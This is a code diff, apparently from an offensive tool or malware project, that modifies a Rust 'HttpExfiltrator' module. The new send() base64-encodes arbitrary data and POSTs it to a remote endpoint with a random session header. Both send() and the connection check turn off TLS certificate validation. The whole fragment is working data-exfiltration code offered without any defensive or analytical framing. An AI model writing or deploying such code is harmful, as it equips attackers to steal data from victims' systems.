@@ -84,30 +84,66 @@ impl HttpExfiltrator {
     }
 }
 
+impl HttpExfiltrator {
+    /// Verifica conexão de forma assíncrona
+    pub async fn check_connection_async(&self) -> bool {
+        self.client
+            .head(&self.endpoint)
+            .timeout(std::time::Duration::from_secs(5))
+            .send()
+            .await
+            .is_ok()
+    }
+}
+
 impl Exfiltrator for HttpExfiltrator {
     fn send(&self, data: &[u8]) -> Result<(), ExfilError> {
-        // Versão síncrona usando tokio runtime
-        let rt = tokio::runtime::Runtime::new()
-            .map_err(|e| ExfilError::SendFailed(e.to_string()))?;
+        // Esta versão é para uso fora de contexto async
+        // Em contexto async, use send_async() diretamente
+        use base64::Engine;
         
-        rt.block_on(self.send_async(data))
+        let encoded = base64::engine::general_purpose::STANDARD.encode(data);
+        let endpoint = self.endpoint.clone();
+        
+        // Criar client novo (blocking)
+        let client: reqwest::blocking::Client = reqwest::blocking::Client::builder()
+            .timeout(std::time::Duration::from_secs(30))
+            .danger_accept_invalid_certs(true)
+            .build()
+            .map_err(|e: reqwest::Error| ExfilError::SendFailed(e.to_string()))?;
+        
+        let response = client
+            .post(&endpoint)
+            .header("Content-Type", "application/octet-stream")
+            .header("X-Session-ID", uuid::Uuid::new_v4().to_string())
+            .body(encoded)
+            .send()
+            .map_err(|e: reqwest::Error| ExfilError::HttpError(e.to_string()))?;
+        
+        if !response.status().is_success() {
+            return Err(ExfilError::HttpError(
+                format!("Status: {}", response.status())
+            ));
+        }
+        
+        Ok(())
     }
     
     fn check_connection(&self) -> bool {
-        // Tentar conexão de teste
-        let rt = match tokio::runtime::Runtime::new() {
-            Ok(rt) => rt,
+        // Versão síncrona com blocking client
+        let client: reqwest::blocking::Client = match reqwest::blocking::Client::builder()
+            .timeout(std::time::Duration::from_secs(5))
+            .danger_accept_invalid_certs(true)
+            .build() 
+        {
+            Ok(c) => c,
             Err(_) => return false,
         };
         
-        rt.block_on(async {
-            self.client
-                .head(&self.endpoint)
-                .timeout(std::time::Duration::from_secs(5))
-                .send()
-                .await
-                .is_ok()
-        })
+        client
+            .head(&self.endpoint)
+            .send()
+            .is_ok()
     }
     
     fn name(&self) -> &str {
